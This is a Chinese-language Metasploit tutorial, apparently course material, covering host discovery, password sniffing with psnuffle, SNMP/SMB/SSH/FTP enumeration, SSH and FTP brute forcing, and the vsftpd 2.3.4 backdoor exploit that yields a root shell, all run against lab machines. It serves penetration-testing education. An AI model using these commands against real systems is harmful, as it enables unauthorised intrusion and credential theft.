# 								Metasploit-Framework-USING

##### 基于 tcp 协议收集主机信息

> 我们前面学习了主动信息收集和被动信息收集，而且还学习了漏洞检测工具 NESSUS，接下来给大
> 家讲解使用 Metasploit 来对目标进行信息收集，这个过程包含了前面所有的方式以及多了一些更加极端
> 的获取信息方式 ，比如获取服务器的硬件信息，系统用户信息、进程信息等。

###### Metasploit 中的 nmap 和 arp_sweep 收集主机信息

> ```
> Metasploit 中也有 NMAP 工具
> db_nmap -sV 192.168.1.1 
> ```

###### ARP 扫描

> ```
> msf6 > use auxiliary/scanner/discovery/arp_sweep	#查看一下模块需要配置哪些参数
> msf6 auxiliary(scanner/discovery/arp_sweep) > show options	#配置 RHOSTS（扫描的目标网络）即可
> msf6 auxiliary(scanner/discovery/arp_sweep) > set RHOSTS 192.168.1.0/24	 #SHOST和SMAC用于伪造源IP和MAC地址msf6 auxiliary(scanner/discovery/arp_sweep) > set THREADS 30	#配置线程数
> msf6 auxiliary(scanner/discovery/arp_sweep) > run
> ```

###### 半连接方式扫描 TCP 端口

> ```
> msf6 > search portscan
> msf6 > use auxiliary/scanner/portscan/syn
> msf6 auxiliary(scanner/portscan/syn) > show options		#查看配置项
> msf6 auxiliary(scanner/portscan/syn) > set RHOSTS 192.168.1.1		#设置扫描的目标
> msf6 auxiliary(scanner/portscan/syn) > set PORTS 80		#设置端口范围使用逗号隔开
> msf6 auxiliary(scanner/portscan/syn) > set THREADS 20		#设置线程数
> msf6 auxiliary(scanner/portscan/syn) > run
> ```

##### 使用 auxiliary /sniffer 下的 psnuffle 模块进行密码嗅探

> ```
> msf6 > search psnuffle
> msf6 > use auxiliary/sniffer/psnuffle
> 
> msf6 auxiliary(sniffer/psnuffle) > info		#查看 psnuffle 的模块作用：
> 
> ##扩展：Dsniff 是一个著名的网络嗅探工具包、高级口令嗅探工具、综合性的网络嗅探工具包。##
> 
> msf6 auxiliary(sniffer/psnuffle) > show options
> msf6 auxiliary(sniffer/psnuffle) > run
> 
> ##新建一个终端窗口登录 ftp，Metasploitable2-Linux 靶机中已经开启了 ftp 服务可以直接登录。##
> 
> apt install lftp -y 		#安装 lftp 命令
> lftp -u msfadmin 192.168.1.180		#登录		密码:msfadmin
> lftp msfadmin@192.168.1.180:~> ls 		##连接成功后，进行下数据交互，查看 ftp 目录下的文件
> 		drwxr-xr-x 6 1000 1000 4096 Apr 28 2010 vulnerable
> 		
> 回到 MSF 终端可以看到用户名密码信息已经被获取。
> 					##嗅探完成后记得把后台任务关闭##
> msf6 auxiliary(sniffer/psnuffle) > jobs 		#查看后台运行的任务
> msf6 auxiliary(sniffer/psnuffle) > kill 0 		#kill job 的 ID，关闭 job
> ```

##### 基于 SNMP 协议收集主机信息

> ```
> 简单网络管理协议（SNMP，Simple Network Management Protocol），由一组网络管理的标
> 准组成，包含一个应用层协议（application layer protocol）、数据库模型（database schema）和一
> 组资源对象。该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。
> ```

> ```
> 我们需要在主机上修改一下 SNMP 服务，因为默认服务是不对外开放的。
> msfadmin@metasploitable:~# vim /etc/default/snmpd
> 改第 11 行
> SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1'
> 为：
> SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0'
> 
> msfadmin@metasploitable:~$ sudo /etc/init.d/snmpd restart		#重启 SNMP 服务
> msfadmin@metasploitable:~$ netstat -antup | grep 161		#确认服务监听正常
> 	(No info could be read for "-p": geteuid()=1000 but you should be root.)
> 	udp 0 0 0.0.0.0:161 0.0.0.0:* - 
> ```

> ```
> 实战-使用 snmp_enum 模块通过 snmp 协议扫描目标服务器信息
> msf6 > use auxiliary/scanner/snmp/snmp_enum
> msf6 auxiliary(scanner/snmp/snmp_enum) > show options
> msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.180
> msf6 auxiliary(scanner/snmp/snmp_enum) > run
> ##可以看到通过 snmp 协议探测到的信息非常多。如服务器硬件信息和服务器当前运行的进程，这两方面是其他扫描方式，获取不到的。
> ```

##### 基于 SMB 协议收集信息

> ```
> SMB 概述：服务器消息块（Server Message Block，缩写为 SMB），又称网络文件共享系统
> （Common Internet File System，缩写为 CIFS），一种应用层网络传输协议，由微软开发，主要功能
> 是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。
> 经过 Unix 服务器厂商重新开发后，它可以用于连接 Unix 服务器和 Windows 客户机，执行打印和
> 文件共享等任务。
> ```

###### 使用 smb_version 基于 SMB 协议扫描版本号

> ```
> msf6 > use auxiliary/scanner/smb/smb_version		#设置扫描目标，注意多个目标使用逗号+空格隔开
> msf6 auxiliary(scanner/smb/smb_version) > show options
> msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.56, 192.168.1.180 
> 	注：192.168.1.56 后面的逗号和 192.168.1.180 之间是有空格的
> msf6 auxiliary(scanner/smb/smb_version) > run
> 	注：可以扫描出来操作系统的版本号，版本号很准确。
> ```

###### 使用 smb_enumshares 基于 SMB 协议扫共享文件（账号、密码）

> ```
> SMB 的模块中基本上都是可以配置用户名和密码的，配置了用户名和密码某些模块扫描的结果会更满足我们的需求。
> 我们到 Windows 中启用一下共享服务。>>新建文件夹 xuegod 并进入该文件夹。>>枚举共享
> msf6 > use auxiliary/scanner/smb/smb_enumshares
> msf6 auxiliary(scanner/smb/smb_enumshares) > show options
> 		$$扫描 192.168.1.53 到 192.168.1.60 的机器$$
> msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.1.56
> 		注：如果你不配置用户，就扫描不到信息。配置一下用户信息，我这里用户是默认的管理员用户，密码没有设置。
> msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBUser administrator
> msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBPass 123456
> msf6 auxiliary(scanner/smb/smb_enumshares) > run
> ```

###### 使用 smb_lookupsid 扫描系统用户信息（SID 枚举）

> ```
> 我们在 Win7 上新建一个 xuegod 用户。密码也是 123456。
> 右键计算机→管理→本地用户和组→用户 ，在空白处，右击新建一个用户
> 用户 xuegod 密码： 123456
> 注：SID 是 Windows 中每一个用户的 ID，更改用户名 SID 也是不会改变的。
> msf6 > use auxiliary/scanner/smb/smb_lookupsid
> msf6 auxiliary(scanner/smb/smb_lookupsid) > show options
> msf6 auxiliary(scanner/smb/smb_lookupsid) > set RHOSTS 192.168.1.56
> msf6 auxiliary(scanner/smb/smb_lookupsid) > set SMBUser administrator
> msf6 auxiliary(scanner/smb/smb_lookupsid) > set SMBPass 123456
> msf6 auxiliary(scanner/smb/smb_lookupsid) > run
> ```

##### 基于 SSH 协议收集信息

###### 查看 ssh 服务的版本信息

> ```
> msf6 > use auxiliary/scanner/ssh/ssh_version
> msf6 auxiliary(scanner/ssh/ssh_version) > show options
> msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.180
> msf6 auxiliary(scanner/ssh/ssh_version) > run
> ```

###### 对 SSH 暴力破解

> ```
> msf6 > use auxiliary/scanner/ssh/ssh_login
> msf6 auxiliary(scanner/ssh/ssh_login) > show options
> msf auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.180
> 	##设置字典文件默认的字典文件是不满足实际需求的后期我们使用更强大的字典文件。
> msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/metasploitframework/data/wordlists/root_userpass.txt
> 	##因为字典文件中不包含我们的用户密码信息我们把自己的密码信息手动加入进去以便展示效果
> 	##新开一个终端窗口
> echo "msfadmin msfadmin" >> /usr/share/metasploitframework/data/wordlists/root_userpass.txt
> 	回到 MSF 终端
> msf6 auxiliary(scanner/ssh/ssh_login) > run
> ```

##### 基于 FTP 协议收集信息

######  查看 ftp 服务的版本信息

> ```
> 	#加载 ftp 服务版本扫描模块
> msf6 > use auxiliary/scanner/ftp/ftp_version
> msf6 auxiliary(scanner/ftp/ftp_version) > show options		#查看设置参数
> msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.1.180		#设置目标 IP，可以设置多个
> msf6 auxiliary(scanner/ftp/ftp_version) > run
> 	#扫描出结果是：vsFTPd 2.3.4
> msf6 auxiliary(scanner/ftp/ftp_version) > back
> 	#扫描出 ftp 服务的版本号，我们可以尝试搜索版本号，看看有没有可以利用的模块
> msf6 > search 2.3.4
> 	#或者搜索 vsftpd
> msf6 > search vsftpd
> 	#我们发现存在一个 exploit 模块，而且这个版本的 ftp 服务存在一个后门
> 	#我们尝试利用下这个模块
> msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.180
> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
> 	#拿到了 shell，而且是 root 权限，我们尝试执行下命令
> 	#执行 id 命令， 查看当前用户
> 	#执行 ifconfig 命令，查看 IP 地址
> ```

###### ftp 匿名登录扫描

> ```
> msf6 > use auxiliary/scanner/ftp/anonymous
> msf6 auxiliary(scanner/ftp/anonymous) show options
> msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.1.180
> msf6 auxiliary(scanner/ftp/anonymous) > run
> ```

######  ftp 暴力破解

> ```
> msf6 > use auxiliary/scanner/ftp/ftp_login
> msf6 auxiliary(scanner/ftp/ftp_login) > show options
> msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.1.180
> 	#设置字典文件默认的字典文件是不满足实际需求的后期我们使用更强大的字典文件。
> msf6 auxiliary(scanner/ftp/ftp_login) > set USERPASS_FILE /usr/share/metasploitframework/data/wordlists/root_userpass.txt
> 	#为字典文件中不包含我们的用户密码信息我们把自己的密码信息手动加入进去以便展示效果
> 	#新开一个终端窗口
> echo "msfadmin msfadmin" >> /usr/share/metasploitframework/data/wordlists/root_userpass.txt
> 	#回到 MSF 终端
> msf6 auxiliary(scanner/ftp/ftp_login) > run
> ```